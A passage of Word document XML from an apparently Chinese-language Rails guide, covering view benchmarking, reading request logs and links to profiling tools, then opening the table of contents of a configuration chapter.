        <w:t>3.3 View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B73C6D6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">视图也大同小异，关于 </w:t>
      </w:r>
      <w:hyperlink r:id="rId835" w:anchor="M000715" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>views</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5375"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="5E9CDC44" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="139FB94A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>benchmark("Showing projects partial") do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7194128A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render @projects</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58981CFC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42BB0C0C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>4 请求日志</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC9FF0E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails 日志文件会再每次处理请求之后返回很多有用的信息，这里是一个典型的日志文件片段：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="6EE07825" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C4A75A2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Processing ItemsController#index (for 127.0.0.1 at 2009-01-08 03:06:39) [GET]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F8F8E83" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rendering template within layouts/items</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="615AF614" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rendering items/index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="799F49D5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Completed in 5ms (View: 2, DB: 0) | 200 OK [</w:t>
            </w:r>
            <w:hyperlink r:id="rId836" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://0.0.0.0/items</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="346E28BD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>在这个片段里面我们可能只会对最后一行感兴趣。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7119"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="6C715ADC" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="011DB9E6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:divId w:val="158037097"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Completed in 5ms (View: 2, DB: 0) | 200 OK [</w:t>
            </w:r>
            <w:hyperlink r:id="rId837" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://0.0.0.0/items</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="53B78D80" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这段文字很好理解了。Rails 用毫秒（ms）为单位来衡量时间。上面这次请求在Rails程序上一共花费了 5ms ，其中在渲染页面中花费了 2ms，没有时间花费在 数据库操作上。 所以我们能很容易的推断出在控制器上花费了3ms。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BC5C50" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Michael Koziarski 有一个 </w:t>
      </w:r>
      <w:hyperlink r:id="rId838" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>有趣的博客日志</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 来解释使用毫秒来做时间度量的重要性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2E49B9" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>5 相关链接</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CEFDD3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Rails 相关插件和开源包</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DEC434B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId839" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Rails Analyzer</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7BDE848F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId840" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Palmist</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="22906CDE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId841" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Rails Footnotes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="19AD5180" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId842" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Query Reviewer</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="291C4E9A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 常用工具</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E003F24" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId843" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>httperf</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2A830FB6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId844" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>ab</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="00FE8579" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId845" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>JMeter</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F5329F4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId846" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>kcachegrind</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="747D5BEB" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 相关教程和文档</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="083C295B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId847" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">ruby-prof </w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>API</w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Documentation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="070B3997" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId848" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Request Profiling Railscast</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004F7237">
        <w:t xml:space="preserve"> – Outdated, but useful for understanding call graphs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54AD0BCE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>6 商业项目</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DAAAF49" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>幸运的是，有一些商业公司为 Rails 提供了非常精致详细的性能测试，下面两个就是这样的公司：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68134800" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="108"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId849" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>New Relic</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46BE28F4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="108"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId850" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Scout</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0835E346" w14:textId="0794B587" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.8、</w:t>
      </w:r>
      <w:hyperlink r:id="rId851" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Rails 应用配置指南</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="165CA49D"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这个指南涵盖了 Rails 应用程序的配置和初始化设置.通过浏览这个指南,你将能:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B23C6A4" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>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调整 Rails 应用程序的运作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268876D8" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>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附加程序启动时运行的代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C43FA48" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="63C4714D" wp14:editId="023B92FC">
            <wp:extent cx="323850" cy="304800"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="33" name="图片 33" descr="http://guides.ruby-china.org/images/chapters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guides.ruby-china.org/images/chapters_icon.gif"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId612" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="323850" cy="304800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E596BD" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="008938C9" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId852" w:anchor="1" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>初始化代码的位置</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="20D4B0CC" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="008938C9" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId853" w:anchor="2" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>先于Rails运行代码</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1A8F3750" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="008938C9" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId854" w:anchor="3" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置 Rails 组件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0349AA32"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55" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>一般的Rails配置</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3C12E122"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56" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置资源</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B53AC32"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57" w:anchor="3-3" w:history="1">
        <w:r w:rsidR="005A4264" w:rsidRPr="005A4264">
